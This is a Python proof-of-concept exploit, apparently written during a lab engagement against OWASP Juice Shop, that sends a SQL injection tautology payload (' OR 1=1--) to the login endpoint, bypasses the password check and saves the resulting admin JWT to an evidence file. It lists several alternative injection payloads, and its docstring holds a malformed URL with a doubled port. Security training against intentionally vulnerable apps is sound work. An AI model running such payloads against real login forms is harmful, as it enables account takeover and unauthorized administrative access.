#!/usr/bin/env python3
"""
PoC: SQL Injection -> Authentication Bypass (admin) on OWASP Juice Shop 20.3.0
Engagement: c03-sqli-admin

Vulnerability
-------------
POST /rest/user/login builds its authentication query with string concatenation
instead of parameter binding. The `email` field is injected directly into the
SQL WHERE clause, so a tautology payload (' OR 1=1--) comments out the password
check and returns the FIRST user row in the table. Because Juice Shop seeds the
admin account with id=1, the first row is the administrator account, and the
server issues a fully valid RS256-signed JWT for it.

Note: the password hash is *not* needed. The -- comment sequence truncates the
remainder of the query, discarding the AND password = '...' condition.

Affected endpoint: http://host.docker.internal:3000:3000 (Juice Shop 20.3.0)
              (lab: http://host.docker.internal:3000)

Usage
-----
    python3 c03_sqli_admin_login.py
    python3 c03_sqli_admin_login.py --base http://host.docker.internal:3000 \
        --out /workspace/evidence/c3_admin_token.txt

Exit code 0 == successful auth bypass, token written to disk.
"""

import argparse
import base64
import json
import sys
import urllib.request

PAYLOAD = "' OR 1=1--"          # tautology + comment out password check
# Alternative equivalent payloads that also work against this build:
#   "' OR 1=1 LIMIT 1--"
#   "admin@juice-sh.op'--"
#   "' OR email='admin@juice-sh.op'--"


def decode_jwt_payload(token):
    """Decode (not verify) the JWT payload segment for reporting/verification."""
    try:
        part = token.split(".")[1]
        part += "=" * (-len(part) % 4)
        return json.loads(base64.urlsafe_b64decode(part))
    except Exception:
        return {}


def main():
    p = argparse.ArgumentParser(description="Juice Shop SQLi -> admin auth bypass PoC")
    p.add_argument("--base", default="http://host.docker.internal:3000",
                   help="Base URL of the Juice Shop instance")
    p.add_argument("--out", default="/workspace/evidence/c3_admin_token.txt",
                   help="Where to write the captured admin JWT")
    p.add_argument("--payload", default=PAYLOAD, help="Injection payload for the email field")
    args = p.parse_args()

    url = args.base.rstrip("/") + "/rest/user/login"
    body = json.dumps({"email": args.payload, "password": "x"}).encode()

    print(f"[*] Target  : {url}")
    print(f"[*] Payload : email = {args.payload!r}")

    req = urllib.request.Request(
        url, data=body, method="POST",
        headers={"Content-Type": "application/json", "Accept": "application/json"},
    )
    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            status = resp.status
            raw = resp.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        status = e.code
        raw = e.read().decode(errors="replace")

    print(f"[*] HTTP    : {status}")

    if status != 200:
        print(f"[-] Exploit failed, response body:\n{raw[:500]}")
        return 1

    try:
        data = json.loads(raw)
        token = data["authentication"]["token"]
        umail = data["authentication"].get("umail") or data["authentication"].get("email")
    except Exception:
        print(f"[-] Could not parse token from response:\n{raw[:500]}")
        return 1

    if not token.startswith("eyJ"):
        print("[-] Returned token is not a JWT (unexpected)")
        return 1

    claims = decode_jwt_payload(token)
    inner = claims.get("data", {})

    print("[+] SUCCESS - authenticated without valid credentials")
    print(f"[+] Logged in as : {inner.get('email')!r}  (id={inner.get('id')})")
    print(f"[+] Role         : {inner.get('role')!r}")
    print(f"[+] JWT algorithm: {json.loads(base64.urlsafe_b64decode(token.split('.')[0] + '==')).get('alg')}")

    if inner.get("role") != "admin":
        print("[!] Warning: obtained token is not an admin token")

    with open(args.out, "w") as f:
        f.write(token + "\n")

    print(f"[+] Admin JWT saved to: {args.out}")
    print(f"[+] Token (first 60 chars): {token[:60]}...")
    return 0


if __name__ == "__main__":
    sys.exit(main())
